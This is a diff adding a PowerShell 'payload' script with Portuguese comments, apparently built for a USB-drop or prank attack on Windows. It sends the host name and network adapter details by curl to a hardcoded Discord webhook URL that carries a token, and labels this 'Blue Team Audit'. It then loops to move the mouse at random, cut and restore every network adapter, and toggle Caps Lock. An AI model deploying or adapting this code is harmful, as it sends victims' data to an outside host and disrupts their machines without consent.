@@ -1,0 +1,27 @@
+# PAYLOAD (.ps1) - MOAA Windows Adapt
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# 1. Notificação e Exfiltração de Info de Rede (Blue Team Audit)
+$net = Get-NetAdapter | Select-Object Name, Status, LinkSpeed | Out-String
+curl.exe -k -s -F ('payload=' + [char]64 + 'MOAA ativo no host: ' + $env:COMPUTERNAME + ' | Rede: ' + $net) $u
+
+# 2. Lógica de "Annoyance" (Irritação) - Rato e Teclado
+Add-Type -AssemblyName System.Windows.Forms
+$wsh = New-Object -ComObject WScript.Shell
+
+# Loop de 10 ciclos para não travar o PC infinitamente durante o teste
+for ($i = 0; $i -lt 10; $i++) {
+    # Mover Rato aleatoriamente
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Min 0 -Max 1000), (Get-Random -Min 0 -Max 1000))
+    
+    # Alternar Wi-Fi (Desliga e Liga a primeira interface encontrada)
+    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
+    Start-Sleep -Seconds 2
+    Get-NetAdapter | Enable-NetAdapter -Confirm:$false
+    
+    # Alternar CAPSLOCK
+    $wsh.SendKeys('{CAPSLOCK}')
+    Start-Sleep -Seconds 2
+}
+
+exit
